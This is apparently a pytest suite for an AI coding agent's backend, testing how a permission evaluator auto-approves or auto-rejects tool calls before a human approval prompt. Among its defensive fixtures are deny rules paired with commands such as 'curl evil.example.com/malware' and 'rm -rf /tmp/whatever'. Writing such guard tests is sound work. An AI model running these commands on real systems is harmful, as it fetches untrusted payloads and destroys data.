"""Tests for the pre-decide-via-PermissionEvaluator path in ``_handle_pause``.

Agno's ``requires_confirmation`` gate fires HITL for every "ask"-level
tool, regardless of permission mode. Plan-mode-deny, acceptEdits-allow,
bypass-allow, and matching ``deny:`` rules were therefore being
short-circuited by the HITL prompt — the user saw an approval dialog
for tools the policy had already decided about.

``_handle_pause`` now runs each paused requirement through the
evaluator first. If the evaluator says DENY/ALLOW the requirement is
auto-resolved (``req.confirm()`` / ``req.reject()`` called directly)
and the FE never sees a ``HITLRequest`` for it. These tests pin that
behavior at the backend boundary.
"""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock

import pytest

from ember_code.backend.pending_requirements_store import PendingRequirementsStore
from ember_code.backend.schemas_pause import PendingRequirement
from ember_code.backend.server import BackendServer
from ember_code.core.config.permission_eval import (
    PermissionEvaluator,
    PermissionMode,
)
from ember_code.protocol import messages as msg


def _make_backend(evaluator: PermissionEvaluator | None) -> BackendServer:
    """A BackendServer built via ``__new__`` (skipping ``__init__``)
    with just enough state for ``_handle_pause`` to run."""
    server = BackendServer.__new__(BackendServer)
    server._session = MagicMock()
    server._session.permission_evaluator = evaluator
    server._hitl_store = PendingRequirementsStore()
    return server


def _pause_event(reqs: list[MagicMock], run_id: str = "run-1") -> MagicMock:
    """Build a RunPausedEvent-shaped mock with the given Agno requirements."""
    event = MagicMock()
    event.run_id = run_id
    event.active_requirements = reqs
    return event


def _req(tool_name: str, tool_args: dict | None = None) -> MagicMock:
    """One Agno requirement mock. ``confirm()`` / ``reject()`` are
    spies so tests can assert which method fired."""
    req = MagicMock(spec=["confirm", "reject", "tool_execution"])
    req.tool_execution = MagicMock()
    req.tool_execution.tool_name = tool_name
    req.tool_execution.tool_args = tool_args or {}
    return req


class TestNoEvaluator:
    def test_falls_back_to_legacy_behavior(self) -> None:
        # When the session has no evaluator wired up (defensive), every
        # req should go through the normal HITLRequest path.
        server = _make_backend(evaluator=None)
        req = _req("edit_file", {"file_path": "a.py"})
        _r = server._handle_pause(_pause_event([req]))
        messages, auto, run_id = _r.messages, _r.auto_resolved, _r.run_id
        assert len(messages) == 1
        assert isinstance(messages[0], msg.RunPaused)
        assert len(messages[0].requirements) == 1
        assert auto == []
        assert run_id == "run-1"
        req.confirm.assert_not_called()
        req.reject.assert_not_called()


class TestPlanMode:
    def test_edit_tool_auto_rejected_no_dialog(self) -> None:
        # Plan mode + edit tool → DENY before HITL. The FE should not
        # see a RunPaused at all; the req should be rejected directly.
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
        server = _make_backend(evaluator=ev)
        req = _req("edit_file", {"file_path": "a.py", "old_string": "x", "new_string": "y"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, run_id = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []  # no RunPaused emitted
        assert auto == [req]
        req.reject.assert_called_once()
        req.confirm.assert_not_called()
        # The reject note must tell the agent why so it can route
        # correctly (suggest /plan off) rather than reporting a
        # generic environment block to the user.
        note = req.reject.call_args.kwargs.get("note") or (
            req.reject.call_args.args[0] if req.reject.call_args.args else ""
        )
        assert "plan mode" in note
        assert "exit_plan_mode" in note
        # And the run_id round-trips for the caller to use in acontinue_run.
        assert run_id == "run-1"

    def test_read_tool_auto_allowed(self) -> None:
        # Plan mode auto-allows reads so the agent can investigate
        # without pestering the user (CC parity).
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
        server = _make_backend(evaluator=ev)
        req = _req("read_file", {"file_path": "a.py"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.confirm.assert_called_once()
        req.reject.assert_not_called()

    def test_readonly_bash_auto_allowed(self) -> None:
        # Read-only shell commands (cat, grep, ls, …) should NOT
        # trigger a HITL prompt under plan mode — they're how the
        # agent investigates.
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
        server = _make_backend(evaluator=ev)
        req = _req("run_shell_command", {"command": "cat src/cli.py"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.confirm.assert_called_once()

    def test_mutating_bash_auto_rejected(self) -> None:
        # ``sed -i`` is a filesystem mutation — plan mode must
        # block it even though it goes through Bash (the tool the
        # agent will most often try to route around restrictions).
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
        server = _make_backend(evaluator=ev)
        req = _req(
            "run_shell_command",
            {"command": "sed -i '' '1s/^/# header\\n/' src/cli.py"},
        )

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.reject.assert_called_once()
        req.confirm.assert_not_called()

    def test_redirect_bash_auto_rejected(self) -> None:
        # ``> file`` also mutates — must block too.
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
        server = _make_backend(evaluator=ev)
        req = _req("run_shell_command", {"command": "echo hi > out.txt"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.reject.assert_called_once()

    def test_friendly_edit_name_also_blocked(self) -> None:
        # The Agno tool_name might come through as the catalog name
        # ``Edit`` rather than the internal ``edit_file``. Both are
        # in FILE_EDIT_TOOLS so both must be denied.
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
        server = _make_backend(evaluator=ev)
        req = _req("Edit", {"file_path": "a.py"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.reject.assert_called_once()


class TestAcceptEditsMode:
    def test_edit_tool_auto_confirmed(self) -> None:
        # acceptEdits + edit tool → ALLOW. No HITL dialog; the tool
        # auto-runs.
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.ACCEPT_EDITS)
        server = _make_backend(evaluator=ev)
        req = _req("edit_file", {"file_path": "a.py"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.confirm.assert_called_once()
        req.reject.assert_not_called()

    def test_non_edit_tool_still_deferred(self) -> None:
        # Bash isn't in FILE_EDIT_TOOLS — acceptEdits should NOT
        # auto-allow it (only edits get auto-approved).
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.ACCEPT_EDITS)
        server = _make_backend(evaluator=ev)
        req = _req("run_shell_command", {"args": ["ls"]})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert len(messages) == 1
        assert isinstance(messages[0], msg.RunPaused)
        assert auto == []


class TestBypassMode:
    def test_any_tool_auto_confirmed(self) -> None:
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.BYPASS_PERMISSIONS)
        server = _make_backend(evaluator=ev)
        req = _req("run_shell_command", {"args": ["whoami"]})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.confirm.assert_called_once()

    def test_deny_rule_beats_bypass(self) -> None:
        # The whole point of scoped deny: even in bypass mode, a
        # ``deny:`` rule must still block. Eval step 2 (deny) runs
        # before step 4 (mode), so the req must reject, not confirm.
        ev = PermissionEvaluator.from_strings(
            mode=PermissionMode.BYPASS_PERMISSIONS,
            deny=["Bash(rm *)"],
        )
        server = _make_backend(evaluator=ev)
        req = _req("Bash", {"command": "rm -rf /tmp/whatever"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.reject.assert_called_once()
        req.confirm.assert_not_called()


class TestDefaultModeWithDenyRule:
    def test_deny_rule_short_circuits_hitl(self) -> None:
        # Default mode + matching deny rule → eval returns DENY at
        # step 2. Must auto-reject, not show HITL.
        ev = PermissionEvaluator.from_strings(
            mode=PermissionMode.DEFAULT,
            deny=["Bash(curl evil.example.com*)"],
        )
        server = _make_backend(evaluator=ev)
        req = _req("Bash", {"command": "curl evil.example.com/malware"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert messages == []
        assert auto == [req]
        req.reject.assert_called_once()


class TestMixedRequirements:
    def test_some_auto_some_defer_stashes_correctly(self) -> None:
        # Two paused reqs:
        #   - one edit under PLAN → reject (auto)
        #   - one MCP-custom tool under PLAN → defer (we don't
        #     classify it, so the user gets prompted)
        # FE should see only the unclassified tool in RunPaused; the
        # rejected edit is returned to the caller for stashing.
        ev = PermissionEvaluator.from_strings(mode=PermissionMode.PLAN)
        server = _make_backend(evaluator=ev)
        edit_req = _req("edit_file", {"file_path": "a.py"})
        custom_req = _req("mcp__weather__forecast", {"city": "Toronto"})

        _r = server._handle_pause(_pause_event([edit_req, custom_req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert len(messages) == 1
        assert isinstance(messages[0], msg.RunPaused)
        # FE sees one HITL — for the unclassified custom tool only.
        assert len(messages[0].requirements) == 1
        assert messages[0].requirements[0].tool_name == "mcp__weather__forecast"
        # The edit was auto-rejected and reported back to caller.
        assert auto == [edit_req]
        edit_req.reject.assert_called_once()
        custom_req.reject.assert_not_called()
        custom_req.confirm.assert_not_called()
        # And the deferred req is stored in the HITL store so the
        # eventual HITLResponseBatch can resolve it.
        assert len(server._hitl_store.pending_ids()) == 1


class TestEvaluatorExceptionFallsThrough:
    def test_evaluator_exception_falls_back_to_dialog(self) -> None:
        # A bad evaluator implementation must not strand the run.
        # Falling back to the user prompt is the safe default.
        evaluator = MagicMock()
        evaluator.evaluate.side_effect = RuntimeError("boom")
        server = _make_backend(evaluator=evaluator)
        req = _req("edit_file", {"file_path": "a.py"})

        _r = server._handle_pause(_pause_event([req]))

        messages, auto, _ = _r.messages, _r.auto_resolved, _r.run_id

        assert len(messages) == 1
        assert isinstance(messages[0], msg.RunPaused)
        assert auto == []
        req.confirm.assert_not_called()
        req.reject.assert_not_called()


class TestResolveHitlBatchMergesAutoResolved:
    """The stashed auto-resolved reqs must be merged into the eventual
    ``acontinue_run`` call so Agno sees the full resolution set."""

    @pytest.mark.asyncio
    async def test_user_decision_plus_stashed_auto_both_passed(self) -> None:
        # Build a server with:
        #   - one pending req the user will resolve
        #   - one auto-rejected req stashed under the same run_id
        server = BackendServer.__new__(BackendServer)
        server._session = MagicMock()
        server._session.sub_agent_hitl.resolve.return_value = False
        server._session.session_id = "sess"
        server._session.hook_executor.execute = AsyncMock(
            return_value=MagicMock(should_continue=True, message="")
        )

        user_req = MagicMock(name="user-req", spec=["confirm", "reject"])
        auto_req = MagicMock(name="auto-req", spec=["confirm", "reject"])
        run_id = "run-mixed"
        server._hitl_store = PendingRequirementsStore()
        server._hitl_store.register("u1", PendingRequirement(req=user_req, run_id=run_id))
        server._hitl_store.stash_auto_resolved(run_id, [auto_req])

        # Capture what's passed into acontinue_run.
        async def _empty(*_a, **_kw):
            if False:
                yield
            return

        server._session.main_team.acontinue_run = MagicMock(side_effect=_empty)

        async def _passthrough(stream):
            async for _ in stream:
                yield _

        server._stream_with_subagent_hitl = _passthrough  # type: ignore[assignment]

        decisions = [msg.HITLDecision(requirement_id="u1", action="confirm", choice="once")]

        async for _ in server.resolve_hitl_batch(decisions):
            pass

        server._session.main_team.acontinue_run.assert_called_once()
        kwargs = server._session.main_team.acontinue_run.call_args.kwargs
        passed = kwargs.get("requirements") or []
        assert user_req in passed
        assert auto_req in passed
        # The bucket should be drained so we don't re-merge on a later resume.
        assert server._hitl_store.auto_resolved_snapshot() == {}
